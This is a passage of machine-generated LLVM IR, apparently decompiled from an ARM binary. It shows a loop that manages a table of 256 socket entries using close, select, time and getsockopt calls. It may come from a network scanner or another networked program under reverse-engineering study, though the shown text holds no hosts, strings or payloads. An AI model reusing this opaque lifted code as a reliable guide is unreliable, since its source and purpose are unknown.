  %v3_112d4 = and i1 %v3_112d0, %v2_112d4
  br i1 %v3_112d4, label %dec_label_pc_11394, label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112c0
  store i1 %v2_11344, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_11344, i1* %cpsr_z.global-to-local, align 1
  %v1_11360 = add i32 %v2_1133c, 4
  %v2_11360 = inttoptr i32 %v1_11360 to i32*
  %v3_11360 = load i32, i32* %v2_11360, align 4
  br i1 %v7_11344, label %dec_label_pc_11360, label %dec_label_pc_112e0

dec_label_pc_112e0:                               ; preds = %dec_label_pc_112d8
  store i32 %v3_11360, i32* %ip.global-to-local, align 4
  %v3_112e8 = udiv i32 %v3_11360, 32
  store i32 %v2_11370, i32* %r0.global-to-local, align 4
  %v3_112f0 = mul nuw nsw i32 %v3_112e8, 4
  %v2_112f4 = add i32 %v3_112f0, %v2_11370
  store i32 %v2_112f4, i32* %r3.global-to-local, align 4
  %v1_112f8 = add i32 %v2_112f4, -184
  %v2_112f8 = inttoptr i32 %v1_112f8 to i32*
  %v3_112f8 = load i32, i32* %v2_112f8, align 4
  %v1_112fc = urem i32 %v3_11360, 32
  store i32 %v1_112fc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_11304 = shl i32 1, %v1_112fc
  %v8_11304 = or i32 %v3_112f8, %v7_11304
  store i32 %v8_11304, i32* %r2.global-to-local, align 4
  store i32 %v8_11304, i32* %v2_112f8, align 4
  %v0_1130c = load i32, i32* @r6, align 4
  %v1_1130c = load i32, i32* %ip.global-to-local, align 4
  %v2_1130c = sub i32 %v0_1130c, %v1_1130c
  %v3_1130c = icmp uge i32 %v0_1130c, %v1_1130c
  store i1 %v3_1130c, i1* %cpsr_c.global-to-local, align 1
  %v4_1130c = xor i32 %v1_1130c, %v0_1130c
  %v5_1130c = xor i32 %v2_1130c, %v0_1130c
  %v6_1130c = and i32 %v5_1130c, %v4_1130c
  %v7_1130c = icmp slt i32 %v6_1130c, 0
  %v8_1130c = icmp slt i32 %v2_1130c, 0
  %v9_1130c = icmp eq i32 %v0_1130c, %v1_1130c
  store i1 %v9_1130c, i1* %cpsr_z.global-to-local, align 1
  %v2_11310 = xor i1 %v8_1130c, %v7_1130c
  br i1 %v2_11310, label %bb324, label %bb325

bb324:                                            ; preds = %dec_label_pc_112e0
  store i32 %v1_1130c, i32* @r6, align 4
  br label %bb325

bb325:                                            ; preds = %dec_label_pc_11350, %dec_label_pc_120b4, %dec_label_pc_113c8, %bb327, %dec_label_pc_112e0, %bb324
  %v3_11314 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11314, i32* %r3.global-to-local, align 4
  %v1_11318 = add i32 %v3_11314, 1
  store i32 %v1_11318, i32* %r2.global-to-local, align 4
  %v2_1131c = icmp ugt i32 %v1_11318, 254
  store i1 %v2_1131c, i1* %cpsr_c.global-to-local, align 1
  %v7_1131c = icmp eq i32 %v1_11318, 255
  store i1 %v7_1131c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_11318, i32* %stack_var_-48, align 4
  %v8_11324 = icmp sgt i32 %v1_11318, 255
  br i1 %v8_11324, label %dec_label_pc_113d4, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %bb325, %dec_label_pc_112ac
  %v0_11334 = phi i32 [ %v1_11318, %bb325 ], [ %v0_112ac, %dec_label_pc_112ac ]
  store i32 ptrtoint (i32* @global_var_1c234.220 to i32), i32* %r0.global-to-local, align 4
  %v3_1132c = mul i32 %v0_11334, 256
  store i32 %v3_1132c, i32* %r3.global-to-local, align 4
  %v2_11330 = load i32, i32* @global_var_1c234.220, align 4
  store i32 %v2_11330, i32* %r1.global-to-local, align 4
  %v2_11338 = mul i32 %v0_11334, 288
  store i32 %v2_11338, i32* %r2.global-to-local, align 4
  %v2_1133c = add i32 %v2_11330, %v2_11338
  store i32 %v2_1133c, i32* @r4, align 4
  %v1_11340 = add i32 %v2_1133c, 12
  %v2_11340 = inttoptr i32 %v1_11340 to i32*
  %v3_11340 = load i32, i32* %v2_11340, align 4
  store i32 %v3_11340, i32* %ip.global-to-local, align 4
  %v2_11344 = icmp ne i32 %v3_11340, 0
  store i1 %v2_11344, i1* %cpsr_c.global-to-local, align 1
  %v7_11344 = icmp eq i32 %v3_11340, 1
  store i1 %v7_11344, i1* %cpsr_z.global-to-local, align 1
  %v2_11348 = xor i1 %v7_11344, true
  %v3_11348 = and i1 %v2_11344, %v2_11348
  br i1 %v3_11348, label %dec_label_pc_112c0, label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %dec_label_pc_11328
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11350 = icmp eq i32 %v3_11340, 0
  store i1 %v2_11350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11350, label %bb325, label %dec_label_pc_112c0

dec_label_pc_11360:                               ; preds = %dec_label_pc_112d8
  store i32 %v3_11360, i32* %r0.global-to-local, align 4
  %v3_11368 = udiv i32 %v3_11360, 32
  %v3_1136c = mul nuw nsw i32 %v3_11368, 4
  store i32 %v2_11370, i32* %lr.global-to-local, align 4
  %v2_11374 = add i32 %v3_1136c, %v2_11370
  store i32 %v2_11374, i32* %r3.global-to-local, align 4
  %v1_11378 = add i32 %v2_11374, -312
  %v2_11378 = inttoptr i32 %v1_11378 to i32*
  %v3_11378 = load i32, i32* %v2_11378, align 4
  %v1_1137c = urem i32 %v3_11360, 32
  store i32 %v1_1137c, i32* %r1.global-to-local, align 4
  %v7_11380 = shl i32 1, %v1_1137c
  %v8_11380 = or i32 %v3_11378, %v7_11380
  store i32 %v8_11380, i32* %r2.global-to-local, align 4
  %v0_11384 = load i32, i32* @r5, align 4
  %v2_11384 = sub i32 %v0_11384, %v3_11360
  %v3_11384 = icmp uge i32 %v0_11384, %v3_11360
  store i1 %v3_11384, i1* %cpsr_c.global-to-local, align 1
  %v4_11384 = xor i32 %v0_11384, %v3_11360
  %v5_11384 = xor i32 %v2_11384, %v0_11384
  %v6_11384 = and i32 %v5_11384, %v4_11384
  %v7_11384 = icmp slt i32 %v6_11384, 0
  %v8_11384 = icmp slt i32 %v2_11384, 0
  %v9_11384 = icmp eq i32 %v0_11384, %v3_11360
  store i1 %v9_11384, i1* %cpsr_z.global-to-local, align 1
  %v2_11388 = xor i1 %v8_11384, %v7_11384
  br i1 %v2_11388, label %bb326, label %bb327

bb326:                                            ; preds = %dec_label_pc_11360
  store i32 %v3_11360, i32* @r5, align 4
  br label %bb327

bb327:                                            ; preds = %dec_label_pc_11360, %bb326
  store i32 %v8_11380, i32* %v2_11378, align 4
  br label %bb325

dec_label_pc_11394:                               ; preds = %dec_label_pc_112c0
  %v1_11394 = add i32 %v2_1133c, 4
  %v2_11394 = inttoptr i32 %v1_11394 to i32*
  %v3_11394 = load i32, i32* %v2_11394, align 4
  store i32 %v3_11394, i32* %r0.global-to-local, align 4
  %v1_11398 = call i32 @close(i32 %v3_11394)
  store i32 %v1_11398, i32* %r0.global-to-local, align 4
  %v0_1139c = load i32, i32* @r4, align 4
  %v1_1139c = add i32 %v0_1139c, 12
  %v2_1139c = inttoptr i32 %v1_1139c to i32*
  %v3_1139c = load i32, i32* %v2_1139c, align 4
  store i32 %v3_1139c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_113a4 = icmp ugt i32 %v3_1139c, 1
  store i1 %v2_113a4, i1* %cpsr_c.global-to-local, align 1
  %v7_113a4 = icmp eq i32 %v3_1139c, 2
  store i1 %v7_113a4, i1* %cpsr_z.global-to-local, align 1
  %v2_113a8 = add i32 %v0_1139c, 4
  %v3_113a8 = inttoptr i32 %v2_113a8 to i32*
  store i32 -1, i32* %v3_113a8, align 4
  %v2_113ac = xor i1 %v2_113a4, true
  %v3_113ac = or i1 %v7_113a4, %v2_113ac
  br i1 %v3_113ac, label %dec_label_pc_120b4, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11394
  %v0_113b0 = load i32, i32* @r4, align 4
  %v1_113b0 = add i32 %v0_113b0, 284
  %v2_113b0 = inttoptr i32 %v1_113b0 to i8*
  %v3_113b0 = load i8, i8* %v2_113b0, align 1
  %v4_113b0 = zext i8 %v3_113b0 to i32
  %v1_113b4 = add nuw nsw i32 %v4_113b0, 1
  %v1_113b8 = urem i32 %v1_113b4, 256
  store i32 %v1_113b8, i32* %r3.global-to-local, align 4
  %v2_113bc = icmp ugt i32 %v1_113b8, 9
  store i1 %v2_113bc, i1* %cpsr_c.global-to-local, align 1
  %v7_113bc = icmp eq i32 %v1_113b8, 10
  store i1 %v7_113bc, i1* %cpsr_z.global-to-local, align 1
  %v1_113c0 = trunc i32 %v1_113b4 to i8
  store i8 %v1_113c0, i8* %v2_113b0, align 1
  %v0_113c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_113c4, label %dec_label_pc_120b4, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b0
  %v0_113c8 = load i32, i32* @r4, align 4
  store i32 %v0_113c8, i32* @r0, align 4
  %v0_113cc = call i32 @function_10744()
  store i32 %v0_113cc, i32* %r0.global-to-local, align 4
  br label %bb325

dec_label_pc_113d4:                               ; preds = %bb325
  store i32 1, i32* %stack_var_-64, align 4
  %v0_113dc = load i32, i32* @r6, align 4
  %v1_113dc = load i32, i32* @r5, align 4
  %v2_113dc = sub i32 %v0_113dc, %v1_113dc
  %v3_113dc = icmp uge i32 %v0_113dc, %v1_113dc
  store i1 %v3_113dc, i1* %cpsr_c.global-to-local, align 1
  %v4_113dc = xor i32 %v1_113dc, %v0_113dc
  %v5_113dc = xor i32 %v2_113dc, %v0_113dc
  %v6_113dc = and i32 %v5_113dc, %v4_113dc
  %v7_113dc = icmp slt i32 %v6_113dc, 0
  %v8_113dc = icmp slt i32 %v2_113dc, 0
  %v9_113dc = icmp eq i32 %v0_113dc, %v1_113dc
  store i1 %v9_113dc, i1* %cpsr_z.global-to-local, align 1
  %v2_113e0 = xor i1 %v8_113dc, %v7_113dc
  %v1_113dc.v0_113dc = select i1 %v2_113e0, i32 %v1_113dc, i32 %v0_113dc
  store i32 %v2_113ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_113f4, i32* %ip.global-to-local, align 4
  store i32 %v2_113f8, i32* %r1.global-to-local, align 4
  %v1_113fc = add i32 %v1_113dc.v0_113dc, 1
  store i32 %v1_113fc, i32* %r0.global-to-local, align 4
  %v13_11408 = call i32 @select(i32 %v1_113fc, %_TYPEDEF_fd_set* %tmp318, %_TYPEDEF_fd_set* %tmp317, %_TYPEDEF_fd_set* null, %timeval* nonnull %tmp320)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_11410 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_11410, i32* @global_var_1c218.208, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  br label %dec_label_pc_11468

dec_label_pc_1142c:                               ; preds = %dec_label_pc_1148c, %dec_label_pc_11578
  %v0_11444 = phi i32 [ %v3_11480, %dec_label_pc_1148c ], [ %v0_1142c.pre, %dec_label_pc_11578 ]
  %v3_1142c = udiv i32 %v0_11444, 32
  %v3_11434 = mul nuw nsw i32 %v3_1142c, 4
  store i32 %v2_11370, i32* %lr.global-to-local, align 4
  %v2_1143c = add i32 %v3_11434, %v2_11370
  store i32 %v2_1143c, i32* %r3.global-to-local, align 4
  %v1_11440 = add i32 %v2_1143c, -184
  %v2_11440 = inttoptr i32 %v1_11440 to i32*
  %v3_11440 = load i32, i32* %v2_11440, align 4
  %v1_11444 = urem i32 %v0_11444, 32
  store i32 %v1_11444, i32* %r1.global-to-local, align 4
  %v2_11448 = add nsw i32 %v1_11444, -1
  %v3_11448 = shl i32 1, %v2_11448
  %v4_11448 = and i32 %v3_11448, %v3_11440
  %v5_11448 = icmp ne i32 %v4_11448, 0
  store i1 %v5_11448, i1* %cpsr_c.global-to-local, align 1
  %v6_11448 = lshr i32 %v3_11440, %v1_11444
  store i32 %v6_11448, i32* %r2.global-to-local, align 4
  %v1_1144c = urem i32 %v6_11448, 2
  %v2_1144c = icmp eq i32 %v1_1144c, 0
  store i1 %v2_1144c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1144c, label %dec_label_pc_11454, label %dec_label_pc_11604.preheader

dec_label_pc_11604.preheader:                     ; preds = %dec_label_pc_1142c
  %v0_11604114 = load i32, i32* @r5, align 4
  %v1_11604115 = add i32 %v0_11604114, 12
  %v2_11604116 = inttoptr i32 %v1_11604115 to i32*
  %v3_11604117 = load i32, i32* %v2_11604116, align 4
  store i32 %v3_11604117, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11608113119 = icmp eq i32 %v3_11604117, 0
  store i1 %v2_11608113119, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11608113119, label %dec_label_pc_11454, label %dec_label_pc_11610.lr.ph

dec_label_pc_11454:                               ; preds = %dec_label_pc_11604.loopexit, %dec_label_pc_11608.backedge, %dec_label_pc_11604.preheader, %dec_label_pc_1142c, %.thread229, %dec_label_pc_11f30, %dec_label_pc_11468, %dec_label_pc_120c8, %dec_label_pc_11f70
  %v3_11454 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11454, i32* %r3.global-to-local, align 4
  %v1_11458 = add i32 %v3_11454, 1
  store i32 %v1_11458, i32* %r2.global-to-local, align 4
  %v2_1145c = icmp ugt i32 %v1_11458, 254
  store i1 %v2_1145c, i1* %cpsr_c.global-to-local, align 1
  %v7_1145c = icmp eq i32 %v1_11458, 255
  store i1 %v7_1145c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_11458, i32* %stack_var_-48, align 4
  %v8_11464 = icmp sgt i32 %v1_11458, 255
  br i1 %v8_11464, label %dec_label_pc_10e0c, label %dec_label_pc_11468

dec_label_pc_11468:                               ; preds = %dec_label_pc_11454, %dec_label_pc_113d4
  %v0_11474 = phi i32 [ %v1_11458, %dec_label_pc_11454 ], [ 0, %dec_label_pc_113d4 ]
  store i32 ptrtoint (i32* @global_var_1c234.220 to i32), i32* %ip.global-to-local, align 4
  %v3_1146c = mul i32 %v0_11474, 256
  store i32 %v3_1146c, i32* %r3.global-to-local, align 4
  %v2_11470 = load i32, i32* @global_var_1c234.220, align 4
  store i32 %v2_11470, i32* %r1.global-to-local, align 4
  %v2_11478 = mul i32 %v0_11474, 288
  store i32 %v2_11478, i32* %r2.global-to-local, align 4
  %v2_1147c = add i32 %v2_11470, %v2_11478
  store i32 %v2_1147c, i32* @r5, align 4
  %v1_11480 = add i32 %v2_1147c, 4
  %v2_11480 = inttoptr i32 %v1_11480 to i32*
  %v3_11480 = load i32, i32* %v2_11480, align 4
  store i32 %v3_11480, i32* %r4.global-to-local, align 4
  %v2_11484 = icmp eq i32 %v3_11480, -1
  store i1 %v2_11484, i1* %cpsr_c.global-to-local, align 1
  %v7_11484 = icmp eq i32 %v3_11480, -1
  store i1 %v7_11484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11484, label %dec_label_pc_11454, label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %dec_label_pc_11468
  %v3_1148c = udiv i32 %v3_11480, 32
  %v3_11494 = mul nuw nsw i32 %v3_1148c, 4
  store i32 %v2_11370, i32* %lr.global-to-local, align 4
  %v2_1149c = add i32 %v3_11494, %v2_11370
  store i32 %v2_1149c, i32* %r3.global-to-local, align 4
  %v1_114a0 = add i32 %v2_1149c, -312
  %v2_114a0 = inttoptr i32 %v1_114a0 to i32*
  %v3_114a0 = load i32, i32* %v2_114a0, align 4
  %v1_114a4 = urem i32 %v3_11480, 32
  store i32 %v1_114a4, i32* %r1.global-to-local, align 4
  %v2_114a8 = add nsw i32 %v1_114a4, -1
  %v3_114a8 = shl i32 1, %v2_114a8
  %v4_114a8 = and i32 %v3_114a0, %v3_114a8
  %v5_114a8 = icmp ne i32 %v4_114a8, 0
  store i1 %v5_114a8, i1* %cpsr_c.global-to-local, align 1
  %v6_114a8 = lshr i32 %v3_114a0, %v1_114a4
  store i32 %v6_114a8, i32* %r2.global-to-local, align 4
  %v1_114ac = urem i32 %v6_114a8, 2
  %v2_114ac = icmp eq i32 %v1_114ac, 0
  store i1 %v2_114ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114ac, label %dec_label_pc_1142c, label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %dec_label_pc_1148c
  store i32 4, i32* %r2.global-to-local, align 4
  store i8 4, i8* %stack_var_-52, align 1
  store i32 %v2_115b4, i32* %r3.global-to-local, align 4
  store i32 %v2_115a0, i32* %ip.global-to-local, align 4
  store i32 %v3_11480, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v8_114e4 = call i32 @getsockopt(i32 %v3_11480, i32 1, i32 4, i32* nonnull %stack_var_-56, i32* %v2_115a8)
  %v3_114e8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_114e8, i32* %r3.global-to-local, align 4
  %v2_114ec = or i32 %v3_114e8, %v8_114e4
  store i32 %v2_114ec, i32* %r0.global-to-local, align 4
  %v4_114ec = icmp eq i32 %v2_114ec, 0
  store i1 %v4_114ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_114ec, label %dec_label_pc_114f4, label %dec_label_pc_120c8

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114b4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_114f8 = load i32, i32* @r5, align 4
  %v2_114f8 = add i32 %v1_114f8, 12
  %v3_114f8 = inttoptr i32 %v2_114f8 to i32*
  store i32 2, i32* %v3_114f8, align 4
  %v0_114fc = call i32 @function_105b0()
  %v3_11504 = load i8, i8* @global_var_1c215.215, align 1
  %v4_11504 = zext i8 %v3_11504 to i32
  store i32 %v4_11504, i32* %r2.global-to-local, align 4
  %v2_11508 = load i8, i8* bitcast (i8** @global_var_1c214.214 to i8*), align 4
  %v3_11508 = zext i8 %v2_11508 to i32
  %v4_1150c = mul nuw nsw i32 %v4_11504, 256
  %v5_1150c = or i32 %v3_11508, %v4_1150c
  store i32 %v5_1150c, i32* %r1.global-to-local, align 4
  %v2_11510 = urem i32 %v0_114fc, %v5_1150c
  store i32 ptrtoint (i32* @global_var_1c1e4.210 to i32), i32* %r3.global-to-local, align 4
  %v2_11518 = load i32, i32* @global_var_1c1e4.210, align 4
  store i32 %v2_11518, i32* %lr.global-to-local, align 4
  %v1_11520 = load i32, i32* @r6, align 4
  %v9_11520 = icmp eq i32 %v2_11518, %v1_11520
  store i1 %v9_11520, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_11510, i32* %r0.global-to-local, align 4
  %v7_11528 = icmp sgt i32 %v2_11518, %v1_11520
  br i1 %v7_11528, label %dec_label_pc_1152c, label %dec_label_pc_120c0

dec_label_pc_1152c:                               ; preds = %dec_label_pc_114f4
  %v2_11530 = load i32, i32* @global_var_1c210.212, align 4
  store i32 %v2_11530, i32* %r3.global-to-local, align 4
  store i32 %v1_11520, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1154c

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11564, %dec_label_pc_1154c
  %v1_1153c = add i32 %v0_1153c, 1
  store i32 %v1_1153c, i32* %ip.global-to-local, align 4
  %v3_11540 = icmp uge i32 %v2_11518, %v1_1153c
  store i1 %v3_11540, i1* %cpsr_c.global-to-local, align 1
  %v9_11540 = icmp eq i32 %v2_11518, %v1_1153c
  store i1 %v9_11540, i1* %cpsr_z.global-to-local, align 1
  %v1_11544 = add i32 %v0_11544, 16
  store i32 %v1_11544, i32* %r3.global-to-local, align 4
  br i1 %v9_11540, label %dec_label_pc_120c0, label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %dec_label_pc_1153c, %dec_label_pc_1152c
  %v0_1153c = phi i32 [ %v1_1153c, %dec_label_pc_1153c ], [ %v1_11520, %dec_label_pc_1152c ]
  %v0_11544 = phi i32 [ %v1_11544, %dec_label_pc_1153c ], [ %v2_11530, %dec_label_pc_1152c ]
  store i32 %v0_11544, i32* %r1.global-to-local, align 4
  %v1_11550 = add i32 %v0_11544, 9
  %v2_11550 = inttoptr i32 %v1_11550 to i8*
  %v3_11550 = load i8, i8* %v2_11550, align 1
  %v4_11550 = zext i8 %v3_11550 to i32
  store i32 %v4_11550, i32* %r2.global-to-local, align 4
  %v1_11554 = add i32 %v0_11544, 8
  %v2_11554 = inttoptr i32 %v1_11554 to i8*
  %v3_11554 = load i8, i8* %v2_11554, align 1
  %v4_11554 = zext i8 %v3_11554 to i32
  %v4_11558 = mul nuw nsw i32 %v4_11550, 256
  %v5_11558 = or i32 %v4_11554, %v4_11558
  store i32 %v5_11558, i32* %r3.global-to-local, align 4
  %v3_1155c = icmp uge i32 %v5_11558, %v2_11510
  store i1 %v3_1155c, i1* %cpsr_c.global-to-local, align 1
  %v9_1155c = icmp eq i32 %v5_11558, %v2_11510
  store i1 %v9_1155c, i1* %cpsr_z.global-to-local, align 1
  %v2_11560 = xor i1 %v9_1155c, true
  %v3_11560 = and i1 %v3_1155c, %v2_11560
  br i1 %v3_11560, label %dec_label_pc_1153c, label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_1154c
  %v1_11564 = add i32 %v0_11544, 10
  %v2_11564 = inttoptr i32 %v1_11564 to i8*
  %v3_11564 = load i8, i8* %v2_11564, align 1
  %v4_11564 = zext i8 %v3_11564 to i32
  store i32 %v4_11564, i32* %r3.global-to-local, align 4
  %v1_11568 = add i32 %v0_11544, 11
  %v2_11568 = inttoptr i32 %v1_11568 to i8*
  %v3_11568 = load i8, i8* %v2_11568, align 1
  %v4_11568 = zext i8 %v3_11568 to i32
  store i32 %v4_11568, i32* %r2.global-to-local, align 4
  %v4_1156c = mul nuw nsw i32 %v4_11568, 256
  %v5_1156c = or i32 %v4_1156c, %v4_11564
  store i32 %v5_1156c, i32* %r3.global-to-local, align 4
  %v3_11570 = icmp uge i32 %v5_1156c, %v2_11510
  store i1 %v3_11570, i1* %cpsr_c.global-to-local, align 1
  %v9_11570 = icmp eq i32 %v5_1156c, %v2_11510
  store i1 %v9_11570, i1* %cpsr_z.global-to-local, align 1
  %v2_11574 = xor i1 %v3_11570, true
  %v3_11574 = or i1 %v9_11570, %v2_11574
  br i1 %v3_11574, label %dec_label_pc_1153c, label %dec_label_pc_11578

dec_label_pc_11578:                               ; preds = %dec_label_pc_11564, %dec_label_pc_120c0
  %v0_11580 = phi i32 [ 0, %dec_label_pc_120c0 ], [ %v0_11544, %dec_label_pc_11564 ]
  %v0_11578 = load i32, i32* @r5, align 4
  %v1_11578 = add i32 %v0_11578, 4
  %v2_11578 = inttoptr i32 %v1_11578 to i32*
  %v3_11578 = load i32, i32* %v2_11578, align 4
  store i32 %v3_11578, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_11580 = inttoptr i32 %v0_11578 to i32*
  store i32 %v0_11580, i32* %v2_11580, align 4
  %v0_11584 = load i32, i32* %ip.global-to-local, align 4
  %v1_11584 = load i32, i32* @r5, align 4
  %v2_11584 = add i32 %v1_11584, 24
  %v3_11584 = inttoptr i32 %v2_11584 to i32*
  store i32 %v0_11584, i32* %v3_11584, align 4
  %v0_1142c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1142c

dec_label_pc_1158c:                               ; preds = %dec_label_pc_117cc, %dec_label_pc_117a0, %dec_label_pc_117e8
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_11590 = call i32 @function_12280(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_11598 = call i32 @function_12280(i32 33)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v3_115a8 = call i32 @function_1219c(i32 32, i32* %v2_115a8)
  store i32 %v3_115a8, i32* @r4, align 4
  store i32 %v2_115b4, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v3_115bc = call i32 @function_1219c(i32 33, i32* nonnull %stack_var_-56)
  %v3_115c0 = load i8, i8* %stack_var_-52, align 1
  %v4_115c0 = sext i8 %v3_115c0 to i32
  %sext9 = mul i32 %v3_115bc, 16777216
  %v1_115c4 = sdiv i32 %sext9, 16777216
  store i32 %v1_115c4, i32* @r6, align 4
  %v0_115c8 = load i32, i32* @r4, align 4
  store i32 %v0_115c8, i32* %r2.global-to-local, align 4
  %v1_115cc = add nsw i32 %v4_115c0, -1
  store i32 %v1_115cc, i32* %r3.global-to-local, align 4
  %v0_115d0 = load i32, i32* @sl, align 4
  store i32 %v0_115d0, i32* %r0.global-to-local, align 4
  %v0_115d4 = load i32, i32* @r5, align 4
  %v1_115d4 = add i32 %v0_115d4, 24
  %v2_115d4 = inttoptr i32 %v1_115d4 to i32*
  %v3_115d4 = load i32, i32* %v2_115d4, align 4
  store i32 %v3_115d4, i32* %r1.global-to-local, align 4
  %v4_115d8 = call i32 @function_12df8(i32 %v0_115d0, i32 %v3_115d4, i32 %v0_115c8, i32 %v1_115cc)
  store i32 %v4_115d8, i32* %r0.global-to-local, align 4
  %v2_115dc = icmp eq i32 %v4_115d8, -1
  store i1 %v2_115dc, i1* %cpsr_c.global-to-local, align 1
  %v7_115dc = icmp eq i32 %v4_115d8, -1
  store i1 %v7_115dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115dc, label %dec_label_pc_11ff0, label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %dec_label_pc_11ff0, %dec_label_pc_1158c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_115f0 = call i32 @function_121c8(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_115f8 = call i32 @function_121c8(i32 33)
  store i32 %v1_115f8, i32* %r0.global-to-local, align 4
  %v0_115fc = load i32, i32* @r7, align 4
  %v3_115fc = icmp eq i32 %v0_115fc, -1
  store i1 %v3_115fc, i1* %cpsr_c.global-to-local, align 1
  %v8_115fc = icmp eq i32 %v0_115fc, -1
  store i1 %v8_115fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_115fc, label %dec_label_pc_11604.loopexit, label %dec_label_pc_117f4

dec_label_pc_11604.loopexit:                      ; preds = %dec_label_pc_11790, %dec_label_pc_11e6c, %dec_label_pc_11684, %dec_label_pc_115ec, %dec_label_pc_11e58
  %v0_11604 = load i32, i32* @r5, align 4
  %v1_11604 = add i32 %v0_11604, 12
  %v2_11604 = inttoptr i32 %v1_11604 to i32*
  %v3_11604 = load i32, i32* %v2_11604, align 4
  store i32 %v3_11604, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11608113 = icmp eq i32 %v3_11604, 0
  store i1 %v2_11608113, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11608113, label %dec_label_pc_11454, label %dec_label_pc_11610.lr.ph

dec_label_pc_11610.lr.ph:                         ; preds = %dec_label_pc_11604.preheader, %dec_label_pc_11604.loopexit
  %v0_11610147 = phi i32 [ %v0_11604, %dec_label_pc_11604.loopexit ], [ %v0_11604114, %dec_label_pc_11604.preheader ]
  br label %dec_label_pc_11610

dec_label_pc_11610:                               ; preds = %dec_label_pc_11608.backedge.thread, %dec_label_pc_11608.backedge, %dec_label_pc_11608.backedge.thread465, %dec_label_pc_11610.lr.ph
  %v0_11fa8 = phi i32 [ %v0_11610147, %dec_label_pc_11610.lr.ph ], [ %v0_11610144, %dec_label_pc_11608.backedge ], [ %v0_11684, %dec_label_pc_11608.backedge.thread ], [ %v0_11684, %dec_label_pc_11608.backedge.thread465 ]
  %v1_11610 = add i32 %v0_11fa8, 24
  %v2_11610 = inttoptr i32 %v1_11610 to i32*
  %v3_11610 = load i32, i32* %v2_11610, align 4
  store i32 %v3_11610, i32* %r3.global-to-local, align 4
  %v2_11614 = icmp ugt i32 %v3_11610, 255
  store i1 %v2_11614, i1* %cpsr_c.global-to-local, align 1
  %v7_11614 = icmp eq i32 %v3_11610, 256
  store i1 %v7_11614, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11fa8, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_11614, label %dec_label_pc_11fa8, label %dec_label_pc_11620

dec_label_pc_11620:                               ; preds = %dec_label_pc_11610, %dec_label_pc_11fa8
  store i32 0, i32* @r6, align 4
  %v1_11624 = load i32, i32* @sb, align 4
  %v2_11624 = inttoptr i32 %v1_11624 to i32*
  store i32 0, i32* %v2_11624, align 4
  %v0_11628 = load i32, i32* @r5, align 4
  %v1_11628 = add i32 %v0_11628, 24
  %v2_11628 = inttoptr i32 %v1_11628 to i32*
  %v3_11628 = load i32, i32* %v2_11628, align 4
  store i32 %v3_11628, i32* %r2.global-to-local, align 4
  %v0_1162c = load i32, i32* @sl, align 4
  %v2_1162c = add i32 %v0_1162c, %v3_11628
  store i32 %v2_1162c, i32* @r4, align 4
  %v1_11630 = add i32 %v0_11628, 4
  %v2_11630 = inttoptr i32 %v1_11630 to i32*
  %v3_11630 = load i32, i32* %v2_11630, align 4
